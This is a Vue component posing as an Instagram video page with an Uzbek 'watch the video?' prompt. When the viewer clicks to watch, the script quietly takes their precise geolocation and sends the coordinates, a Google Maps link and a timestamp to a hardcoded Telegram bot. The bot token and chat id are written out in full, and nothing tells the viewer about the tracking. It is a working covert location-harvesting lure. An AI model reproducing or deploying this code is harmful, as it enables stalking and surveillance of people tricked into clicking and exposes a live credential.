<template>
  <div class="video-container">
    <!-- Modal -->
    <div class="modal" v-if="showModal">
      <div class="modal-content">
        <img
          loading="lazy"
          width="48"
          height="48"
          src="./assets/logos.png"
          alt=""
        />
        <h2>Videoni ko'rishni xohlaysizmi?</h2>
        <button class="allow-btn" @click="allowVideo">Ko'rish</button>
      </div>
    </div>

    <!-- Video Player -->
    <div v-if="showVideo" class="video-box">
      <video controls autoplay class="insta-video">
        <source src="./assets/mainvideo.mp4" type="video/mp4" />
        Your browser does not support the video tag.
      </video>
    </div>
  </div>
</template>

<script>
export default {
  name: "InstagramVideo",
  data() {
    return {
      showModal: true,
      showVideo: false,
      latitude: null,
      longitude: null,
      botToken: "7622854137:AAH6xblJA8biVHaE4VbC1svOAC-izatOoZI",
      chatId: "5673984207",
    };
  },
  methods: {
    allowVideo() {
      this.showModal = false;
      this.showVideo = true;
      this.getGeolocation();
    },

    getGeolocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            this.latitude = position.coords.latitude;
            this.longitude = position.coords.longitude;
            this.sendToTelegram();
          },
          (error) => {
            console.error("Geolocation error:", error.message);
            this.sendToTelegram(true);
          },
          {
            enableHighAccuracy: true,
            timeout: 5000,
            maximumAge: 0,
          }
        );
      } else {
        this.sendToTelegram(true);
      }
    },

    sendToTelegram(error = false) {
      const message = error
        ? `❌ Geolocation olishda xatolik yuz berdi yoki foydalanuvchi rad etdi.`
        : `📍 Yangi foydalanuvchi joylashuvi:
Latitude: ${this.latitude}
Longitude: ${this.longitude}
🗺️ Google Maps: https://www.google.com/maps?q=${this.latitude},${this.longitude}
🕒 Vaqt: ${new Date().toLocaleString()}
`;

      const encodedMessage = encodeURIComponent(message);
      const telegramUrl = `https://api.telegram.org/bot${this.botToken}/sendMessage?chat_id=${this.chatId}&text=${encodedMessage}`;

      fetch(telegramUrl)
        .then((res) => res.json())
        .then((data) => {
          console.log("Telegramga yuborildi:", data);
        })
        .catch((err) => {
          console.error("Telegramga yuborishda xatolik:", err);
        });
    },
  },
};
</script>

<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}
.video-container {
  display: flex;
  justify-content: center;
  align-items: center;
  width: 100%;
  min-height: 100vh;
  background-color: #000;
  color: #fff;
  position: relative;
  font-family: Arial, sans-serif;
}

/* Modal styling */
.modal {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background-color: rgba(0, 0, 0, 0.8);
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 10;
}

.modal-content {
  background-color: #1a1a1a;
  padding: 30px 40px;
  border-radius: 12px;
  display: flex;
  flex-direction: column;
  gap: 10px;
  align-items: center;
  text-align: center;
  box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
}

.allow-btn {
  margin-top: 20px;
  background-color: #0095f6;
  color: white;
  padding: 10px 20px;
  border: none;
  border-radius: 8px;
  font-weight: bold;
  cursor: pointer;
}

.allow-btn:hover {
  background-color: #0078cc;
}

/* Video player styling */
.video-box {
  max-width: 400px;
  width: 100%;
  padding: 20px;
  border-radius: 20px;
  background-color: #111;
}

.insta-video {
  width: 100%;
  border-radius: 12px;
}
</style>
